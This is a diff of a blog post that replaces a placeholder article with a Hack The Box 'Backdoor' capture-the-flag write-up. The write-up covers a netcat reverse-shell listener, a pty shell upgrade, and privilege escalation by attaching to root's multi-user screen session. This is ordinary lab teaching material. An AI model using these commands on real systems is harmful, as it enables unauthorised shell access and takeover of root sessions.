@@ -1,14 +1,13 @@
 ---
 layout: post
 comments: true
-title: "Storing API credentials on Python"
-tags: ['good-practice','Python','cryptography']
+title: "Backdoor HTB WriteUp"
+tags: ['hackthebox','screen','wordpress']
 ---
 
 ## Introduction
 
-As we work with APIs we need to use some credentials to interact with them. These credentials can be stored in a safe way or not.
-In this post we are going to cover the most popular practices to handle sensitive credentials from worst to best.
+This an easy linux machine, we can learn how to discover Wordpress plugins, search vulnerabilities on them. Also, we are going to be covering some screen missconfigurations.
 
 ## Enumeration
 
@@ -338,7 +337,7 @@ We can google search about this process. In this [HackTricks Post][HackTricks Gd
 
 First we are going to set up a reverse shell at 4444:
 ```bash
-nc -lvnp 444
+nc -lvnp 4444
 ```
 
 Second, we are going to follow the steps posted in the [guide][HackTricks GdbServer]:
@@ -383,19 +382,46 @@ cat user.txt
 #### Upgrading the shell
 We can upgrade the shell:
 ```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-#### Identifiying missconfiguration
+#### Identifiying screen missconfiguration
 In the process that we list above, we also can see a [screen][screen man] process.
 
+A screen can be attached if multi-user is enabled.
+
+To list the screen a user is running, just run the command
+```bash
+screen -ls $USER/
+```
+
+If we try this for root:
+```bash
+screen -ls root/
+```
+Output:
+```
+There is a suitable screen on:
+        952.root        (09/07/22 17:31:21)     (Multi, detached)
+1 Socket in /run/screen/S-root.
+```
+
+We can see that root user is running a screen called root and it's suitable for us.
+We can attatch to it.
+
+```bash
+screen -r root/root
+```
+POUM!💣
+Now we are inside root user and we can capture the flag.
 
 
+Thank's all for reading!📙
 
 [screen man]: https://linux.die.net/man/1/screen
 
-[Bash script dt]: http://google.es
-[Bash script list]: http://google.es
+[Bash script dt]: https://github.com/isuckatlinux/htbmachines/blob/main/backdoor/exploits/dt.sh
+[Bash script list]: https://github.com/isuckatlinux/htbmachines/blob/main/backdoor/exploits/list_process.sh
 
 [HackTricks guide]: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
 [HackTricks GdbServer]: https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver
